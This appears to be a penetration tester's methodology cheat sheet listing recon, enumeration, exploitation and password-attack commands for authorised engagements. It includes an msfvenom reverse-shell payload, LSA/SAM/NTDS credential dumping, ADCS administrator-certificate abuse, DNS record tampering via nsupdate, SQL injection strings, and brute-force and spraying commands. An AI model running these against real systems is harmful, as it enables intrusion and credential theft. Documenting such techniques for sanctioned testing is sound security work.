## Overview
This document serves as a general guide for conducting penetration tests; however, the methods outlined are not exhaustive and are not expected to be documented to completion. 
### Kill Chain
The following kill chain is an framework comprised of components from MITRE ATT&CK and the Lockheed Martin Cyber Kill Chain. This is generally the logical process I follow through an engagement. Naturally, steps will be added and removed as the engagement evolves. Remember that penetration testing is an organic process most of the time.  
- Reconnaissance
	- OSINT
	- Passive Scanning
	- Active Scanning
- Initial Access
	- Phishing
	- Exploitation
	- Leaked Credentials
- Defense Evasion
	- Payload Obfuscation
	- EDR Tampering
	- Living Off The Land (LOTL)
- Persistence
	- Backdoor
	- Account Creation
	- Configuration Changes
- Discovery
	- Port Scanning
	- AD/LDAP Enumeration
	- Broadcast Traffic Poisoning
- Lateral Movement
	- Remote Access Services
	- Pass-The-Hash (PTH)/Pass-The-Ticket (PTT)
	- Secondary Host Exploitation
- Privilege Escalation
	- Exploit Known Vulnerability
	- Excessive Permissions
	- Password Cracking
- Actions On Objectives
	- Data Exfiltration
	- Command & Control (C2)
	- Domain Takeover
### Engagement Timeline
1. Necessary documentation is gathered from the client (SoW, Scope, etc.).
2. Kickoff call to confirm documents are correct and testing can begin.
3. Active testing 
4. Vulnerability scanning 
5. Reporting 
6. Closeout call to review results
### Engagement Types
Clients will commission different test types based on their needs. The most common assessments include an external and an internal pentest. Larger organizations might commission a full red team engagement which will include several other engagement types as part of an adversary simulation. 
- OSINT - Passive reconnaissance on a target using publicly available sources.
- Social Engineering - Coerce information/access from the people at the target org.
- Physical - Attempt to gain access to secure areas of a physical location. 
- External - Attempt to gain entry to the internal network from the internet.
- Internal - Attempt to escalate privileges from within the target network.
- WebApp - Attempt to exploit a web application to gain privileged access. 
- Mobile - Attempt to exploit a mobile application and/or the backend APIs. 
- Red Team - Full adversary simulation.
- Purple Team - Adversary simulation where the Blue Team cooperates with the Red Team to detect/remediate threats in real time. 
## Initial Recon
### OSINT
#### Google
Search Pastebin
- `site:pastebin.com intext:"CompanyName"`
Search GitHub
- `site:github.com intext:"CompanyName"`
Search Docker Hub
- `site:hub.docker.com intext:"CompanyName"`
Search for S3 buckets
- `site:amazonaws.com inurl:s3 intext:"CompanyName"`
Search for Azure blobs
- `site:blob.core.windows.net intext:"CompanyName"`
#### LinkedIn
Create list of usernames
- `linkedin2username you@email.com corp -n @corp.com -o ./li2u/corp/`
#### Websites
- Whois: https://whois.domaintools.com/
- Reverse Whois: https://reversewhois.domaintools.com/
- ICANN IP Lookup: https://lookup.icann.org/en/lookup- 
- Internet Connected Host Search: https://www.shodan.io
- DNS Archives: https://dnsdumpster.com
- Breach DB Search: https://www.dehashed.com
#### Brute-Force Domain Discovery
Enumerate sub-domains
- `gobuster dns -d example.com -w /wordlists/domains.txt -i`
- `fierce -dns example.com -wordlist /wordlists/domains.txt`
### Scanners
#### Network
Scan top 100 ports
- `nmap -iL scope.txt -F -oA nmap.initial`
Scan top 100 ports without verifying host is up
- `nmap -iL scope.txt -F -Pn nmap.np -oA nmap.np.initial`
Scan first 10000 ports, no ping, return only open
- `nmap -iL noping.txt -Pn -p 1-10000 --open -oA nmap.np.open`
Common script scan first 10000 ports
- `nmap -iL ping.txt -p 1-10000 -sC -oA nmap.scripts` 
##### SMB
List directories up to a depth of three
- `smbmap -H 127.0.0.1 -u $user -p $password -R --depth 3 --exclude IPC$`
##### DNS
Request short list of domains on the nameserver
- `dig +short ns nameserver.dns`
Request all DNS records on the name server (TXT, MX, A, etc.):
- `dig @nameserver domain.local -t ANY`
Request DNS name for IP address
- `dig 127.0.0.1 @nameserver`
Attempt DNS zone transfer
- `dig axfr nameserver.dns @domain.to.transfer`
Sometimes, nameservers can be modified without credentialed access:
```r
nsupdate 
> server 127.0.0.1 53 
> update delete example.com A  
> send 
> update add example.com 86400 A 127.0.0.1 
> send
```
#### Cloud
Enumerate cloud assets
- `cloud-enum -k company_name -l cloud_enum.log`
#### WebApp
Enumerate directories
- `gobuster dir -u https://example.com -w /wordlists/test.txt -lk -o gobuster.txt` 
Scan web services 
- `nikto -h https://example.com`
Full scan WordPress sites
- `wpscan --url https://example.com -e -o wpscan.txt`
#### API
#### Web-App Analysis 
- Wappalyzer - Identify technologies used. 
- Entry Points - Input, uploads, buttons, URL parameters, etc.  
- Guest Accounts - Authenticated session without credentials?
- User Enumeration - Login errors, IDOR, etc.
- `sslyze https://example.com` - Checks for SSL/TLS issues. 
## Service Enumeration
### Scanners
#### Network
##### SMB
- `smbmap -H 127.0.0.1 -u $user -p $password -R --depth 3 --exclude IPC$`
##### DNS
Request short list of domains on the nameserver:
- `dig +short ns nameserver.dns`
Request all DNS records on the name server (TXT, MX, A, etc.):
- `dig @nameserver domain.local -t ANY`
Request DNS name for IP address:
- `dig 127.0.0.1 @nameserver`
Attempt DNS zone transfer:
- `dig axfr nameserver.dns @domain.to.transfer`
Sometimes, nameservers can be modified without credentialed access:
```r
nsupdate 
> server 127.0.0.1 53 
> update delete example.com A  
> send 
> update add example.com 86400 A 127.0.0.1 
> send
```
#### Cloud
- `cloud-enum -k company_name -l cloud_enum.log`
#### WebApp
- `gobuster dir -u https://example.com -w /wordlists/test.txt -lk -o gobuster.txt` 
- `nikto -h https://example.com`
- `wpscan --url https://example.com -e -o wpscan.txt`
#### API
#### Web-App Analysis 
- Wappalyzer - Identify technologies used. 
- Entry Points - Input, uploads, buttons, URL parameters, etc.  
- Guest Accounts - Authenticated session without credentials?
- User Enumeration - Login errors, IDOR, etc.
- `sslyze https://example.com` - Checks for SSL/TLS issues. 
## Exploitation
### Windows
- [ ] App Domain
#### Unquoted Service Path
Find vulnerable services using PowerShell:
`Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select Name,DisplayName,StartMode,PathName`
- [ ] .lnk files
Check write permissions in directory before the space: 
`Get-Acl C:\DirectoryName\`
Generate payload:
`msfvenom -p windows/x64/shell/reverse_tcp LHOST=127.0.0.1 LPORT=9001 -f exe-service -o mal.exe`
- [ ] Petit Pottam
#### Credential Caches
Dump credential caches
- `crackmapexec smb 127.0.0.1 -u $username -p $password --lsa`
- `crackmapexec smb 127.0.0.1 -u $username -p $password --sam`
Clone domain controller
- `crackmapexec smb 127.0.0.1 -u $username -p $password --ntds --users --enabled` (Requires DA, don't use this without permission from the client)
#### Shell Access
Port 5985 open, with credentials
- `evil-winrm -i <IP_ADDRESS> -u <USERNAME> -p <PASSWORD>`
#### Named Pipe Exploitation
### Linux
- [ ] `sudo -l`
- [ ] GTFOBins
### Active Directory Attack
#### ADCS Abuse
Windows enumerate vulnerable certificates
- `certify.exe find domain.local/user:pass@domain.local -vulnerable`
Linux enumerate vulnerable certificates
- `certipy-ad find -u 'user' -p 'pass' -dc-ip '127.0.0.1' -vulnerable -stdout`
Request vulnerable certificate for admin
- `certipy-ad req -u 'user' -p 'pass' -dc-ip '127.0.0.1' -ca 'DOMAIN-CA' -target 'dc.local' -template 'VULN-TEMPLATE' -upn 'administrator@domain.local' -ns '127.0.0.1'`
- [ ] NTLM Relay
- [ ] IPv6 (MITM6)
#### CrackMapExec
- `cme smb -u 'guest' -p '' --shares`
- `cme smb -u 'user' -p 'pass' -M spider_plus
- `cme smb -u 'user' -p 'password' --lsa`
- `cme smb -u 'user' -p 'password' --local-auth`
### Web App
#### Server Side
##### SQLi
- `valid_input'-- -`
- `valid_input'select * from information_schema.tables -- -`
- [ ] Broken Authentication
- [ ] Directory Traversal
- [ ] Command Injection
- [ ] Business Logic 
- [ ] Information Disclosure
- [ ] Broken Access Control
- [ ] File Uploads
- [ ] Race Conditions
- [ ] SSRF
- [ ] XXE
#### Client Side
- [ ] XSS
- [ ] CSRF
- [ ] CORS
- [ ] Clickjacking
- [ ] DOM Vulnerabilities
- [ ] WebSockets
#### Advanced
- [ ] Insecure Deserialization
- [ ] GraphQL API
- [ ] SSTi
- [ ] Web Cache Poisoning
- [ ] HTTP Host Header Attacks
- [ ] HTTP Request Smuggling
- [ ] OAuth 
- [ ] JWT Attacks
- [ ] Prototype Pollution 
## Password Attacks
### Test logins and MFA
- Default Credentials (admin:admin, admin:password, etc.)
- MFASweep - Identifies authentication endpoints that allow legacy authentication. 
- `hydra 127.0.0.1 ssh -l $user -P /wordlist.txt -s 22 -vV`
### Password Spraying
- Burp Intruder (POST login forms)
- `go365 -endpoint rst -ul users.txt -pl passwords.txt -d domain.com -w 5 -delay 1600 -o go365_domain.txt`
- `wpscan --url http://example.com -e u --passwords /usr/share/wordlists/pass.txt`
### Password Cracking
- `hashcat -m 500 -a 0 -o cracked.txt hash.txt wordlist.txt`
- `john --format=raw-sha1 --wordlist=/usr/share/rockyou.txt ./sha1hash.txt`